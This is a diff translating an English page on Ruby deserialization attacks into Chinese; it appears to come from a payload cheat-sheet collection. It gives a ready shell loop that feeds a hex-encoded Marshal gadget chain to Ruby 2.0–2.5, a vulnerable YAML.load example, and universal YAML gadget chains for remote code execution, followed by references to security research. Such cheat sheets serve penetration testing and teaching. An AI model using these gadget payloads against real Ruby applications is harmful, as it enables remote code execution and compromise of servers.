@@ -1,31 +1,33 @@
-# Ruby Deserialization
+[原文文档](Ruby.en.md)
 
-> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.
+# Ruby 反序列化
 
-## Summary
+> Ruby 反序列化是将序列化数据转换回 Ruby 对象的过程，通常使用 YAML、Marshal 或 JSON 等格式。例如，Ruby 的 Marshal 模块通常用于此目的，因为它可以序列化和反序列化复杂的 Ruby 对象。
 
-* [Marshal Deserialization](#marshal-deserialization)
-* [YAML Deserialization](#yaml-deserialization)
-* [References](#references)
+## 摘要
 
-## Marshal Deserialization
+* [Marshal 反序列化](#marshal-反序列化)
+* [YAML 反序列化](#yaml-反序列化)
+* [参考资料](#参考资料)
 
-Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
+## Marshal 反序列化
+
+用于生成和验证针对 Ruby 2.0 到 2.5 的反序列化小工具链的脚本
 
 ```ruby
 for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
 ```
 
-## YAML Deserialization
+## YAML 反序列化
 
-Vulnerable code
+易受攻击的代码
 
 ```ruby
 require "yaml"
 YAML.load(File.read("p.yml"))
 ```
 
-Universal gadget for ruby <= 2.7.2:
+Ruby <= 2.7.2 的通用小工具：
 
 ```yaml
 --- !ruby/object:Gem::Requirement
@@ -39,7 +41,7 @@ requirements:
       spec:
 ```
 
-Universal gadget for ruby 2.x - 3.x.
+Ruby 2.x - 3.x 的通用小工具。
 
 ```yaml
 ---
@@ -85,10 +87,10 @@ Universal gadget for ruby 2.x - 3.x.
           method_id: :resolve 
 ```
 
-## References
+## 参考资料
 
-* [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://www.elttam.com.au/blog/ruby-deserialization/)
-* [Universal RCE with Ruby YAML.load - Etienne Stalmans (@_staaldraad) - March 2, 2019](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
-* [Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)
-* [Universal RCE with Ruby YAML.load (versions > 2.7) - Etienne Stalmans (@_staaldraad) - January 9, 2021](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
-* [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
+* [Ruby 2.X 通用 RCE 反序列化小工具链 - Luke Jahnke - 2018 年 11 月 8 日](https://www.elttam.com.au/blog/ruby-deserialization/)
+* [使用 Ruby YAML.load 的通用 RCE - Etienne Stalmans (@_staaldraad) - 2019 年 3 月 2 日](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
+* [Ruby 2.x 通用 RCE 反序列化小工具链 - PentesterLab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)
+* [使用 Ruby YAML.load 的通用 RCE（版本 > 2.7）- Etienne Stalmans (@_staaldraad) - 2021 年 1 月 9 日](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
+* [通过 YAML 反序列化进行盲远程代码执行 - Colin McQueen - 2021 年 6 月 9 日](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
